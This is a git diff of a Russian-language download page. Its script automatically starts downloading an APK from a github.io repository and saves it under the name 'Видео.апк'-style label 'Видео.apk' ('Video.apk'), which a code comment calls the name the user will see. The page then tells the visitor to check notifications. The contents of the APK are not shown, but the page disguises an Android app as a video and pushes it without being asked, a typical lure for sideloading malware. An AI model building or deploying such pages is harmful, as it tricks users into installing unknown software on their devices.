@@ -9,39 +9,11 @@
     <title>Начало загрузки</title>
     
     <style>
-        body { 
-            font-family: sans-serif; 
-            text-align: center; 
-            padding-top: 50px; 
-            background-color: #f0f0f0; 
-            color: #333;
-        }
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            background: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        .spinner { 
-            border: 8px solid #f3f3f3; 
-            border-top: 8px solid #3498db; 
-            border-radius: 50%; 
-            width: 60px; 
-            height: 60px; 
-            animation: spin 1.5s linear infinite; 
-            margin: 20px auto; 
-        }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
-        a {
-            color: #3498db;
-            text-decoration: none;
-            font-weight: bold;
-        }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f0f0f0; color: #333; }
+        .container { max-width: 400px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); }
+        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        a { color: #3498db; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -55,11 +27,13 @@
     <script>
         // --- 🔑 КЛЮЧЕВАЯ КОНФИГУРАЦИЯ ---
         
-        // ИСПРАВЛЕННЫЙ АДРЕС: https://94kz55hfdb-netizen.github.io/test/
+        // 1. Ваш корректный базовый URL
         const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
         
-        // Полный путь к файлу APK: https://94kz55hfdb-netizen.github.io/test/downloads/test.apk
-        const apkUrl = repoBaseUrl + 'downloads/test.apk'; 
+        // 2. ПУТЬ К ФАЙЛУ ИСПРАВЛЕН НА test1.apk
+        const apkUrl = repoBaseUrl + 'downloads/test1.apk'; 
+        
+        // 3. Имя, которое увидит пользователь
         const apkFilename = 'Видео.apk'; 
         
         // ------------------------------------
@@ -73,7 +47,7 @@
             link.click();
             document.body.removeChild(link);
 
-            document.querySelector('h1').textContent = "Загрузка началась!";
+            document.querySelector('h1').textContent = "Загрузка началась! Проверьте уведомления.";
             document.querySelector('.spinner').style.display = 'none';
         }
 
